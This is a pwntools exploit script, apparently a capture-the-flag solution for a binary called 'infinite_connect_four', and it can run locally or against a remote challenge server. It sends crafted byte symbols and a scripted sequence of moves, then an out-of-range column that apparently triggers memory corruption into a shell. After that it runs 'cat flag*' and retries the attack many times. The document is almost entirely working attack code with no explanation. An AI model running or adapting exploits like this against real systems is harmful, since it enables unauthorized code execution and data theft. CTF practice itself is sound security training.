from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./infinite_connect_four"
elf = ELF(vuln_path)
libc = elf.libc



def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def pwn(io):
    io.sendlineafter("Enter player 1 symbol > ", "\xc9")
    io.sendlineafter("Enter player 2 symbol > ", "\xaf")
    
    for i in range(0x8):
        io.sendlineafter("Player 1 choose your column (0 - 7) > ", "0")
        io.sendlineafter("Player 2 choose your column (0 - 7) > ", "0")
    
    for i in range(0x3):
        io.sendlineafter("Player 1 choose your column (0 - 7) > ", "2")
        io.sendlineafter("Player 2 choose your column (0 - 7) > ", "1")
        io.sendlineafter("Player 1 choose your column (0 - 7) > ", "2")
        io.sendlineafter("Player 2 choose your column (0 - 7) > ", "1")
        io.sendlineafter("Player 1 choose your column (0 - 7) > ", "2")
        io.sendlineafter("Player 2 choose your column (0 - 7) > ", "1")
        io.sendlineafter("Player 1 choose your column (0 - 7) > ", "1")
        io.sendlineafter("Player 2 choose your column (0 - 7) > ", "2")
    
    io.sendlineafter("Player 1 choose your column (0 - 7) > ", "1")
    io.sendlineafter("Player 2 choose your column (0 - 7) > ", "1")
    io.sendlineafter("Player 1 choose your column (0 - 7) > ", "1")
    io.sendlineafter("Player 2 choose your column (0 - 7) > ", "1")
    
    # ddebug("breakrva 0x01DC2\ncontinue")
    io.sendlineafter("Player 1 choose your column (0 - 7) > ", "8")
    io.recvuntil("erm... what the sigma?\n", drop=True) 
    sleep(1)
    # io.interactive()
    io.sendline("cat flag*")
    sleep(1)
    data = io.recv(timeout=1)
    if b"{" in data and b"}" in data:
        log.success(data)
        pause()


for i in range(0x20):
    log.success(f"-------------{i}------------------")
    try:
        io = process([vuln_path]) if not f_remote else remote("challs.nusgreyhats.org", 33102)
        pwn(io)
    except:
        pass
    finally:
        io.close()
